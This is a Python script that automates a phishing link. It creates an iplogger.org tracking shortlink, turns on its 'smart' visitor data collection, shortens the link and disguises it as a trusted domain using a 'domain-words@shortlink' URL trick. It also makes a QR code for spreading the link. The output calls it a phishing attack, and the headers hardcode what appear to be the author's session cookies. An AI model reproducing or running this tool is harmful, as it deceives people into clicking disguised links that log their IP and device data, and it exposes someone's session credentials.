import requests
import qrcode
import webbrowser
import time 
import re

# Define the URL and headers
url = 'https://iplogger.org/create/shortlink/'
headers = {
    'Host': 'iplogger.org',
    'Cookie': '_lang=us; _autolang=us; cursor=BhAVd3r4N5Q123R374w976q1vrJxZz5q; turnback=main%2F; 37526381824560001=2; integrity=Iif4wwHkJOyXOCZeD7zEyWIy; cookies-consent=1694283590; confirmation=0c1DTR71TRTWvaivjOnRiDSw3OTWzWIw; loggers=OThLZDQ2NmVMRmNWLHVGSmQ0WGIySDRleSxUREpkNEhSQlJ4NlcsbkRKZDRCSWsxZHc5LHVVSmQ0RG5MZE4xYixOWUpkNHFKdXFkcFksRVdKZDREanI3Y2Mw',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'multipart/form-data; boundary=---------------------------23076503212940169586286782236',
    'Origin': 'https://iplogger.org',
    'Referer': 'https://iplogger.org/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Te': 'trailers'
}

# Get the destination URL from the user
destination_url = input("Enter the destination URL:\n")

# Define the multipart/form-data payload
payload = f'''-----------------------------23076503212940169586286782236
Content-Disposition: form-data; name="destination"

{destination_url}
-----------------------------23076503212940169586286782236--
'''

# Send the POST request
#cookies are mine sometimes wont work so conf with your cookies value
response = requests.post(url, headers=headers, data=payload)

# Check if the request was successful
if response.status_code == 200:
    # Parse the JSON response
    data = response.json()
    # Extract the "go" value from the response
    go_value = data.get("go")
    match = re.search(r'\/([^\/]+)\/$', go_value)
    if match:
        extracted_value = match.group(1)
        print("---------------------------------------------------------------\nImplementing phishing attack:\n")
        print(f"Tracking id generated for phishing: {extracted_value}\n---------------------------------------------------------------")
    else:
        print("Api Limit exceed")
else:
    print(f"Failed to create tracking  code: {response.status_code}")

# getting sharable phi link
# URL PHI and headers
url_phi=f"https://iplogger.org/logger/{extracted_value}/"
headers_phi = {
    "Host": "iplogger.org",
    "Cookie": "_lang=us; _autolang=us; cursor=BhAVd3r4N5Q123R374w976q1vrJxZz5q; turnback=main%2F;  37526381824560001=2; integrity=Iif4wwHkJOyXOCZeD7zEyWIy; cookies-consent=1694283590; confirmation=0c1DTR71TRTWvaivjOnRiDSw3OTWzWIw; loggers=TmFMZDRjVFdIRlpsLDk4S2Q0NjZlTEZjVix1RkpkNFhiMkg0ZXksVERKZDRIUkJSeDZXLG5ESmQ0Q0lrMWR3OSx1VUpkNERuTGROM1o%3D",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "https://iplogger.org/",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Te": "trailers"
}

# Send the GET request PHI
response_phi = requests.get(url_phi, headers=headers_phi)

# Check if the request was successful PHI
if response_phi.status_code == 200:
    # Find the data-shortlink attribute in the response text
    start_index = response_phi.text.find('data-shortlink="') + len('data-shortlink="')
    end_index = response_phi.text.find('"', start_index)
    data_shortlink = response_phi.text[start_index:end_index]
else:
    print(f"Request failed with Sharable link {response_phi.status_code}")

# Activating Smart data Getter

# Define the URL and headers ACT
url_act = "https://iplogger.org/logger/update/"
headers_act = {
    "Host": "iplogger.org",
    "Cookie": "_lang=us; _autolang=us; cursor=BhAVd3r4N5Q123R374w976q1vrJxZz5q; turnback=logger%2F%2F; 37526381824560001=2; integrity=Iif4wwHkJOyXOCZeD7zEyWIy; cookies-consent=1694283590; confirmation=0c1DTR71TRTWvaivjOnRiDSw3OTWzWIw; loggers=TmFMZDRjVFdIRlpsLDk4S2Q0NjZlTEZjVix1RkpkNFhiMkg0ZXksVERKZDRIUkJSeDZXLG5ESmQ0QklrMWR3OSx1VUpkNERuTGROMWIsTllKZDRxSnVxZHBZLEVXSmQ0RGpyN2NjMA%3D%3D",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "https://iplogger.org",
    "Referer": "https://iplogger.org/logger/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Te": "trailers",
}

# Data with the updated value ACT
data = {
    "name": "smart",
    "value": "1",
    "code": extracted_value,
}

# Send the POST request ACT
response_act = requests.post(url_act, headers=headers_act, data=data)

# Get the status code
status_code_act = response_act.status_code

qr = qrcode.QRCode(
    version=1,  # QR code version (adjust as needed)
    error_correction=qrcode.constants.ERROR_CORRECT_L,  # Error correction level
    box_size=10,  # Size of each box in the QR code
    border=4,  # Border size (adjust as needed)
)


# Print the status code
print("Phishing url dashboard page:\n",url_phi)
print("---------------------------------------------------------------")
print("Now Masking the Geninue URL :)")


mask = input('Domain to Mask the Phishing URL like www.google.com :\n')
print('---------------------------------------------------------------\nType social engineering words: (like free-money, best-pubg-tricks):')
words = input("")

#iplogger to is.gd url shorter
response = requests.get(f"https://is.gd/create.php?format=simple&url={data_shortlink[8:]}")
short = response.text
shorter = short.replace("https://", "")
final = f"{mask}-{words}@{shorter}"

print("---------------------------------------------------------------\nThe phishing url generated share this :\n\n",final,"\n---------------------------------------------------------------")
qr_url="qr url  :"+final
qr.add_data(qr_url)
qr.make(fit=True)
print("Display Fake website qr code and redirecting to dashboard")
img = qr.make_image(fill_color="black", back_color="white")
time.sleep(7)
img.show()

print("check browser...")
time.sleep(7)
webbrowser.open(url_phi)
